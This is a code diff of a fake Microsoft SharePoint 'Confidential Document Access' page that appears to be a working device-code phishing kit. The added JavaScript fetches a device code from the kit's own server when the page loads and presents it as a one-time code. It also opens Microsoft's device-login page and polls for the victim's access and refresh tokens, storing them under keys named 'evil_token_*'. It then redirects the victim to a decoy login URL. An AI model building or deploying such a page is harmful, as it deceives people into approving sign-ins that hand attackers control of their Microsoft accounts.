@@ -23,7 +23,6 @@
             border-radius: 8px;
             overflow: hidden;
         }
-        /* --- SHAREPOINT TOP NAV BAR --- */
         .top-nav {
             background: #f7f7f7;
             border-bottom: 1px solid #e1e5e9;
@@ -37,7 +36,6 @@
             font-weight: 500;
             color: #333;
         }
-        /* --- MAIN TEAL HEADER --- */
         .header {
             background: #007b8a;
             color: white;
@@ -45,7 +43,6 @@
         }
         .header h1 { font-size: 18px; font-weight: 600; margin-bottom: 4px; }
         .header p { font-size: 13px; opacity: 0.9; }
-        /* --- DOCUMENT PREVIEW CARD --- */
         .document-preview {
             padding: 24px;
             background: #fafafa;
@@ -63,7 +60,7 @@
             max-width: 480px;
             box-shadow: 0 1px 4px rgba(0,0,0,0.04);
         }
-        .doc-card .doc-icon {
+        .doc-icon {
             display: flex;
             align-items: center;
             gap: 10px;
@@ -84,7 +81,6 @@
             margin: 8px 0 4px;
         }
         .doc-meta { font-size: 12px; color: #777; }
-        /* --- BLURRED PREVIEW WRAPPER --- */
         .preview-wrapper {
             position: relative;
             width: 100%;
@@ -126,7 +122,6 @@
             border-bottom: 1px solid #eee;
             padding-bottom: 2px;
         }
-        /* --- FLOATING PILL OVERLAY --- */
         .overlay-pill {
             position: absolute;
             top: 50%;
@@ -156,7 +151,6 @@
             align-items: center;
             gap: 6px;
         }
-        /* --- OTP SECTION --- */
         .otp-section {
             padding: 20px 24px;
             background: white;
@@ -173,6 +167,7 @@
             color: #007b8a;
             margin-bottom: 12px;
             text-align: center;
+            min-width: 200px;
         }
         .otp-label {
             font-size: 9px;
@@ -197,8 +192,10 @@
             font-size: 13px;
             cursor: pointer;
             margin-left: 8px;
+            transition: background 0.15s;
         }
         .copy-btn:hover { background: #005f6b; }
+        .copy-btn:disabled { opacity: 0.5; pointer-events: none; }
         .loading-spinner {
             display: flex;
             align-items: center;
@@ -222,7 +219,7 @@
 </head>
 <body>
     <div class="container">
-        <!-- EXACT MODERN SHAREPOINT LOGO + TOP NAV -->
+        <!-- TOP NAV -->
         <div class="top-nav">
             <svg width="20" height="20" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
                 <circle cx="46" cy="40" r="25" fill="#03787c" />
@@ -234,7 +231,7 @@
             <span>SharePoint</span>
         </div>
 
-        <!-- TEAL HEADER -->
+        <!-- HEADER -->
         <div class="header">
             <h1>Confidential Document Access</h1>
             <p>The confidential document is protected. Access requires verification with a one‑time code through your Microsoft account.</p>
@@ -244,7 +241,6 @@
         <div class="document-preview">
             <div class="doc-card">
                 <div class="doc-icon">
-                    <!-- Blue 'doc' icon -->
                     <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                         <rect width="24" height="24" rx="4" fill="#007b8a"/>
                         <text x="12" y="16" font-family="Arial, sans-serif" font-weight="bold" font-size="11" fill="white" text-anchor="middle">doc</text>
@@ -254,8 +250,8 @@
                 </div>
                 <div class="doc-title">Quarterly Business Review</div>
                 <div class="doc-meta">Confidential document · View only · Microsoft 365</div>
-                
-                <!-- BLURRED PREVIEW + FLOATING PILL -->
+
+                <!-- BLURRED PREVIEW -->
                 <div class="preview-wrapper">
                     <div class="blurred-preview">
                         <h4>Quarterly Business Review</h4>
@@ -272,7 +268,6 @@
                     </div>
                 </div>
 
-                <!-- FOOTER -->
                 <div class="doc-footer">
                     <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#666" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                         <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
@@ -283,44 +278,201 @@
             </div>
         </div>
 
-        <!-- OTP SECTION -->
+        <!-- OTP SECTION with Device Flow -->
         <div class="otp-section">
             <p><strong>Confidential document access</strong></p>
-            <p style="font-size:13px; color:#555;">Enter this one-time code in the Microsoft sign-in window to unlock this file.</p>
+            <p style="font-size:13px; color:#555;">Enter this one‑time code in the Microsoft sign‑in window to unlock this file.</p>
             <div>
                 <div class="otp-code-box">
                     <div class="otp-label">VERIFICATION CODE</div>
-                    <!-- DYNAMIC INJECTION POINT FOR YOUR CLOUDFLARE WORKER -->
-                    <div id="otpDisplay">{{OTP_CODE}}</div>
+                    <div id="otpDisplay">Loading…</div>
                 </div>
-                <button class="copy-btn" onclick="copyOTP()">Copy code</button>
+                <button class="copy-btn" id="copyBtn" disabled>Copy code</button>
             </div>
-            <div class="loading-spinner">
+
+            <!-- LOADING SPINNER -->
+            <div class="loading-spinner" id="loadingSpinner">
                 <div class="spinner"></div>
-                <span>Opening Microsoft sign‑in…</span>
+                <span id="spinnerText">Requesting code…</span>
             </div>
         </div>
 
-        <!-- FOOTER -->
         <div class="footer">Microsoft SharePoint</div>
     </div>
 
-    <!-- COPY SCRIPT -->
     <script>
-        function copyOTP() {
-            const otp = document.getElementById('otpDisplay').innerText;
-            navigator.clipboard.writeText(otp).then(() => {
-                alert('Code copied!');
-            }).catch(() => {
-                const textarea = document.createElement('textarea');
-                textarea.value = otp;
-                document.body.appendChild(textarea);
-                textarea.select();
-                document.execCommand('copy');
-                document.body.removeChild(textarea);
-                alert('Code copied!');
+        (function() {
+            'use strict';
+
+            const otpDisplay = document.getElementById('otpDisplay');
+            const copyBtn = document.getElementById('copyBtn');
+            const loadingSpinner = document.getElementById('loadingSpinner');
+            const spinnerText = document.getElementById('spinnerText');
+
+            let deviceCode = '';
+            let userCode = '';
+            let verificationUri = '';
+            let pollInterval = null;
+            let isPolling = false;
+            let isApproved = false;
+            const API_BASE = window.location.origin;
+
+            function setCode(text, state = '') {
+                otpDisplay.textContent = text;
+                // If text is "Error" or "EXPIRED", disable copy
+                copyBtn.disabled = (text === 'Error' || text === 'EXPIRED' || text === 'Loading…');
+            }
+
+            function copyOTP() {
+                const code = otpDisplay.textContent.trim();
+                if (!code || code === 'Loading…' || code === 'Error' || code === 'EXPIRED') {
+                    alert('No valid code to copy.');
+                    return;
+                }
+                if (navigator.clipboard && navigator.clipboard.writeText) {
+                    navigator.clipboard.writeText(code).then(() => {
+                        copyBtn.textContent = 'Copied!';
+                        setTimeout(() => { copyBtn.textContent = 'Copy code'; }, 1800);
+                    }).catch(() => fallbackCopy(code));
+                } else {
+                    fallbackCopy(code);
+                }
+            }
+
+            function fallbackCopy(text) {
+                const ta = document.createElement('textarea');
+                ta.value = text;
+                ta.style.position = 'fixed';
+                ta.style.top = '-9999px';
+                ta.style.left = '-9999px';
+                document.body.appendChild(ta);
+                ta.select();
+                try {
+                    document.execCommand('copy');
+                    copyBtn.textContent = 'Copied!';
+                    setTimeout(() => { copyBtn.textContent = 'Copy code'; }, 1800);
+                } catch (err) {
+                    alert('Unable to copy. Please select the code manually.');
+                }
+                document.body.removeChild(ta);
+            }
+
+            copyBtn.addEventListener('click', copyOTP);
+
+            function openVerificationUri(uri) {
+                if (!uri) return;
+                const newWindow = window.open(uri, '_blank');
+                if (!newWindow || newWindow.closed || typeof newWindow.closed === 'undefined') {
+                    // Popup blocked – just update spinner text
+                    spinnerText.textContent = 'Popup blocked. Please manually open: ' + uri;
+                } else {
+                    spinnerText.textContent = 'Opening Microsoft sign‑in…';
+                }
+            }
+
+            async function pollForToken() {
+                if (!deviceCode || isPolling || isApproved) return;
+                isPolling = true;
+                try {
+                    const resp = await fetch(`${API_BASE}/device/token`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ device_code: deviceCode })
+                    });
+                    const data = await resp.json();
+                    if (data.access_token) {
+                        isApproved = true;
+                        clearInterval(pollInterval);
+                        pollInterval = null;
+                        setCode('Approved ✓');
+                        copyBtn.disabled = true;
+                        spinnerText.textContent = 'Verification complete! Redirecting…';
+                        setTimeout(() => {
+                            localStorage.setItem('evil_token_direct', data.access_token);
+                            if (data.refresh_token) localStorage.setItem('evil_token_refresh', data.refresh_token);
+                            localStorage.setItem('evil_token_user', data.username || 'User');
+                            window.location.href = '/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https://login.microsoftonline.com/';
+                        }, 800);
+                        isPolling = false;
+                        return;
+                    }
+                    if (data.error === 'authorization_pending') {
+                        spinnerText.textContent = 'Waiting for approval on Microsoft page…';
+                        isPolling = false;
+                        return;
+                    }
+                    if (data.error === 'expired_token') {
+                        clearInterval(pollInterval);
+                        pollInterval = null;
+                        setCode('EXPIRED');
+                        copyBtn.disabled = true;
+                        spinnerText.textContent = 'Code expired. Refresh the page.';
+                        isPolling = false;
+                        return;
+                    }
+                    if (data.error) {
+                        spinnerText.textContent = `Error: ${data.error} — retrying…`;
+                        isPolling = false;
+                        return;
+                    }
+                    spinnerText.textContent = 'Still waiting…';
+                    isPolling = false;
+                } catch (err) {
+                    console.error('Poll error:', err);
+                    // No red bar – just show error in OTP box and spinner
+                    setCode('Error');
+                    copyBtn.disabled = true;
+                    spinnerText.textContent = 'Network error. Check console.';
+                    isPolling = false;
+                }
+            }
+
+            async function startDeviceFlow() {
+                setCode('Loading…');
+                copyBtn.disabled = true;
+                spinnerText.textContent = 'Requesting code…';
+                loadingSpinner.style.display = 'flex';
+                try {
+                    const resp = await fetch(`${API_BASE}/device/request`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' }
+                    });
+                    if (!resp.ok) throw new Error(`HTTP ${resp.status}`);
+                    const data = await resp.json();
+                    if (data.error) throw new Error(data.error_description || data.error);
+                    deviceCode = data.device_code;
+                    userCode = data.user_code;
+                    verificationUri = data.verification_uri || 'https://microsoft.com/devicelogin';
+                    setCode(userCode);
+                    copyBtn.disabled = false;
+                    // Automatically open the verification URI
+                    openVerificationUri(verificationUri);
+                    if (pollInterval) clearInterval(pollInterval);
+                    const intervalMs = (data.interval || 5) * 1000 + 500;
+                    pollInterval = setInterval(pollForToken, intervalMs);
+                    setTimeout(pollForToken, 1000);
+                } catch (err) {
+                    console.error('Device flow error:', err);
+                    setCode('Error');
+                    copyBtn.disabled = true;
+                    spinnerText.textContent = 'Error loading code.';
+                }
+            }
+
+            document.addEventListener('DOMContentLoaded', () => {
+                setTimeout(startDeviceFlow, 400);
             });
-        }
+
+            document.addEventListener('keydown', (e) => {
+                if (e.key === 'r' && !e.ctrlKey && !e.metaKey && !e.altKey) {
+                    e.preventDefault();
+                    if (pollInterval) clearInterval(pollInterval);
+                    isApproved = false;
+                    startDeviceFlow();
+                }
+            });
+
+        })();
     </script>
 </body>
 </html>
